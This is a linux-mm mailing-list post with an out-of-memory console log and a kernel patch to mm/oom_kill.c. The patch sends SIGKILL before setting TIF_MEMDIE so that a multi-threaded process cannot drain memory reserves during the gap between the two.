[  157.304169]  [<ffffffff81096b59>] ? set_next_entity+0x69/0x360
[  157.305737]  [<ffffffff8161c918>] page_fault+0x28/0x30
[  157.307186]  [<ffffffff813124c0>] ? __clear_user+0x20/0x50
[  157.308699]  [<ffffffff81316dd8>] iov_iter_zero+0x68/0x250
[  157.310210]  [<ffffffff813e9ef8>] read_iter_zero+0x38/0xa0
[  157.311713]  [<ffffffff8117ad04>] __vfs_read+0xc4/0xf0
[  157.313155]  [<ffffffff8117b489>] vfs_read+0x79/0x120
[  157.314575]  [<ffffffff8117c1a0>] SyS_read+0x50/0xc0
[  157.315980]  [<ffffffff8161adee>] entry_SYSCALL_64_fastpath+0x12/0x71
[  157.317649] Showing busy workqueues and worker pools:
[  157.319070] workqueue events: flags=0x0
[  157.320261]   pwq 2: cpus=1 node=0 flags=0x0 nice=0 active=4/256
[  157.321980]     pending: vmstat_shepherd, vmstat_update, e1000_watchdog [e1000], vmpressure_work_fn
[  157.324279] workqueue events_freezable: flags=0x4
[  157.325652]   pwq 2: cpus=1 node=0 flags=0x0 nice=0 active=1/256
[  157.327373]     pending: vmballoon_work [vmw_balloon]
[  157.328859] workqueue events_power_efficient: flags=0x80
[  157.330343]   pwq 2: cpus=1 node=0 flags=0x0 nice=0 active=1/256
[  157.332067]     pending: neigh_periodic_work
[  157.333431] workqueue events_freezable_power_: flags=0x84
[  157.334941]   pwq 2: cpus=1 node=0 flags=0x0 nice=0 active=1/256
[  157.336684]     in-flight: 228:disk_events_workfn
[  157.338168] workqueue xfs-log/sda1: flags=0x14
[  157.339473]   pwq 7: cpus=3 node=0 flags=0x0 nice=-20 active=2/256
[  157.341255]     in-flight: 1369:xfs_log_worker
[  157.342674]     pending: xfs_buf_ioend_work
[  157.344066] pool 2: cpus=1 node=0 flags=0x0 nice=0 workers=3 idle: 43 14
[  157.346039] pool 7: cpus=3 node=0 flags=0x0 nice=-20 workers=2 manager: 27
[  185.044658] sysrq: SysRq : Show Memory
[  185.045975] Mem-Info:
[  185.046968] active_anon:423788 inactive_anon:2085 isolated_anon:0
[  185.046968]  active_file:0 inactive_file:1 isolated_file:0
[  185.046968]  unevictable:0 dirty:0 writeback:0 unstable:0
[  185.046968]  slab_reclaimable:1689 slab_unreclaimable:5401
[  185.046968]  mapped:391 shmem:2146 pagetables:2123 bounce:0
[  185.046968]  free:4 free_pcp:0 free_cma:0
[  185.056165] Node 0 DMA free:0kB min:400kB low:500kB high:600kB active_anon:14076kB inactive_anon:80kB active_file:0kB inactive_file:0kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:15988kB managed:15904kB mlocked:0kB dirty:0kB writeback:0kB mapped:8kB shmem:80kB slab_reclaimable:144kB slab_unreclaimable:340kB kernel_stack:240kB pagetables:572kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:8 all_unreclaimable? yes
[  185.066444] lowmem_reserve[]: 0 1731 1731 1731
[  185.068083] Node 0 DMA32 free:16kB min:44652kB low:55812kB high:66976kB active_anon:1681076kB inactive_anon:8260kB active_file:0kB inactive_file:4kB unevictable:0kB isolated(anon):0kB isolated(file):0kB present:2080640kB managed:1774392kB mlocked:0kB dirty:0kB writeback:0kB mapped:1556kB shmem:8504kB slab_reclaimable:6612kB slab_unreclaimable:21264kB kernel_stack:19328kB pagetables:7920kB unstable:0kB bounce:0kB free_pcp:0kB local_pcp:0kB free_cma:0kB writeback_tmp:0kB pages_scanned:0 all_unreclaimable? no
[  185.079186] lowmem_reserve[]: 0 0 0 0
[  185.080783] Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
[  185.083790] Node 0 DMA32: 3*4kB (UM) 1*8kB (U) 1*16kB (U) 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 36kB
[  185.087232] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=2048kB
[  185.089572] 2147 total pagecache pages
[  185.091096] 0 pages in swap cache
[  185.092469] Swap cache stats: add 0, delete 0, find 0/0
[  185.094288] Free swap  = 0kB
[  185.095671] Total swap = 0kB
[  185.097075] 524157 pages RAM
[  185.098466] 0 pages HighMem/MovableOnly
[  185.100005] 76583 pages reserved
[  185.101435] 0 pages hwpoisoned
[  205.509157] sysrq: SysRq : Resetting
---------- console log start ----------
Complete log is at http://I-love.SAKURA.ne.jp/tmp/serial-20150731.txt.xz .

Thus, here is a SEPARATE PATCH WITH A JUSTIFICATION.
After applying this patch, I can no longer reproduce this problem.

----------------------------------------

>From 2945dffb8d602947800348d44d317bae152f890c Mon Sep 17 00:00:00 2001
From: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
Date: Fri, 31 Jul 2015 19:06:28 +0900
Subject: [PATCH 2/2] mm,oom: Reverse the order of setting TIF_MEMDIE and
 sending SIGKILL.

It is observed that a multi-threaded program can deplete memory reserves
using time lag between the OOM killer sets TIF_MEMDIE and the OOM killer
sends SIGKILL. This is because a thread group leader who gets TIF_MEMDIE
received SIGKILL too lately when there is a lot of child threads sharing
the same memory due to doing a lot of printk() inside for_each_process()
loop which can take many seconds.

Before starting oom-depleter process:

    Node 0 DMA: 3*4kB (UM) 6*8kB (U) 4*16kB (UEM) 0*32kB 0*64kB 1*128kB (M) 2*256kB (EM) 2*512kB (UE) 2*1024kB (EM) 1*2048kB (E) 1*4096kB (M) = 9980kB
    Node 0 DMA32: 31*4kB (UEM) 27*8kB (UE) 32*16kB (UE) 13*32kB (UE) 14*64kB (UM) 7*128kB (UM) 8*256kB (UM) 8*512kB (UM) 3*1024kB (U) 4*2048kB (UM) 362*4096kB (UM) = 1503220kB

As of invoking the OOM killer:

    Node 0 DMA: 11*4kB (UE) 8*8kB (UEM) 6*16kB (UE) 2*32kB (EM) 0*64kB 1*128kB (U) 3*256kB (UEM) 2*512kB (UE) 3*1024kB (UEM) 1*2048kB (U) 0*4096kB = 7308kB
    Node 0 DMA32: 1049*4kB (UEM) 507*8kB (UE) 151*16kB (UE) 53*32kB (UEM) 83*64kB (UEM) 52*128kB (EM) 25*256kB (UEM) 11*512kB (M) 6*1024kB (UM) 1*2048kB (M) 0*4096kB = 44556kB

Between the thread group leader got TIF_MEMDIE and receives SIGKILL:

    Node 0 DMA: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB
    Node 0 DMA32: 0*4kB 0*8kB 0*16kB 0*32kB 0*64kB 0*128kB 0*256kB 0*512kB 0*1024kB 0*2048kB 0*4096kB = 0kB

The oom-depleter's thread group leader which got TIF_MEMDIE started
memset() in user space after the OOM killer set TIF_MEMDIE, and it
was free to abuse ALLOC_NO_WATERMARKS by TIF_MEMDIE for memset()
in user space until SIGKILL is delivered. If SIGKILL is delivered
before TIF_MEMDIE is set, the oom-depleter can terminate without
touching memory reserves.

Signed-off-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>
---
 mm/oom_kill.c | 8 ++++++--
 1 file changed, 6 insertions(+), 2 deletions(-)

diff --git a/mm/oom_kill.c b/mm/oom_kill.c
index 5249e7e..c0a5a69 100644
--- a/mm/oom_kill.c
+++ b/mm/oom_kill.c
@@ -555,12 +555,17 @@ void oom_kill_process(struct oom_control *oc, struct task_struct *p,
 	/* Get a reference to safely compare mm after task_unlock(victim) */
 	mm = victim->mm;
 	atomic_inc(&mm->mm_users);
-	mark_oom_victim(victim);
 	pr_err("Killed process %d (%s) total-vm:%lukB, anon-rss:%lukB, file-rss:%lukB\n",
 		task_pid_nr(victim), victim->comm, K(victim->mm->total_vm),
 		K(get_mm_counter(victim->mm, MM_ANONPAGES)),
 		K(get_mm_counter(victim->mm, MM_FILEPAGES)));
 	task_unlock(victim);
+	/* Send SIGKILL before setting TIF_MEMDIE. */
+	do_send_sig_info(SIGKILL, SEND_SIG_FORCED, victim, true);
+	task_lock(victim);
+	if (victim->mm)
+		mark_oom_victim(victim);
+	task_unlock(victim);
 
 	/*
 	 * Kill all user processes sharing victim->mm in other thread groups, if
@@ -586,7 +591,6 @@ void oom_kill_process(struct oom_control *oc, struct task_struct *p,
 		}
 	rcu_read_unlock();
 
-	do_send_sig_info(SIGKILL, SEND_SIG_FORCED, victim, true);
 	mmput(mm);
 	put_task_struct(victim);
 }
-- 
1.8.3.1

--
To unsubscribe, send a message with 'unsubscribe linux-mm' in
the body to majordomo@kvack.org.  For more info on Linux MM,
see: http://www.linux-mm.org/ .
Don't email: <a href=mailto:"dont@kvack.org"> email@kvack.org </a>
